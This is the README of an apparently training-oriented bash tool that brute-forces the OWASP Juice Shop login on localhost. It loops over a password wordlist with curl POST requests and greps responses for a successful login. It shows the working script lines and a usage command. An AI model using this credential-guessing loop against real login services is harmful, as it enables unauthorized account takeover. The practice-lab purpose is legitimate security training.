# Welcome to Curl Post Brute Force!

Hi! This tool allow you to make post request and it was developed to help you to solve juice shop brute force problems.

## Permission
After you clone the repository give permission to sh file.

    $ sudo chmod +x ./postCurl.sh

# Files

The main file is called **postCurl.sh**.
It's very simple to use, you just have to pass three parameters.

> **First**, for juice shop app you'll use the email. e.g admin@juice-sh.op
> **Second**, The host: http://localhost:3000/rest/user/login
> **Third**, You'll need to informe a wordlist

## Example
Execute the following code and don't forget to grab a cup of coffee.
**Don't forget to change the host.**

    $ ./postCurl.sh admin@juice-sh.op http://localhost:3000/user/rest/login /usr/share/wordlist/rockyou.txt

# How it works
First inside the file we have a simple parameters validate.

    if [ "$3" = "" ]; then
	    echo "How to use"
	    echo "./postCurl.sh [USERNAME] [HOST] [WORDLIST]"


After that we have a loop which **cat** a wordlist and put inside of **pass** variable.

    for pass in $(cat $3); do
    
Inside of the loop I made a **curl** request and put the response inside the **chamada** variable.

    chamada=$(curl -s --header "Content-Type: application/json" --request POST --data '{"email":"'$1'", "password":"'$pass'"}' $2)

I used this var to **grep** a specific word in a juice shop response and if the **if** found it, it will prints the username and password on the screen and break the loop.

    if grep "authentication" <<< "$chamada" ; then
		echo "[+] username: "$1 " , password: "$pass
		break
	fi

### Possibles upgrades.
|Feature|Benefits|
|--|--|
|sleep|it's help you not break the service|
|parameter to grep|for this first upload i put a hard code, but the good idea is that you able to choose what you looking for.|

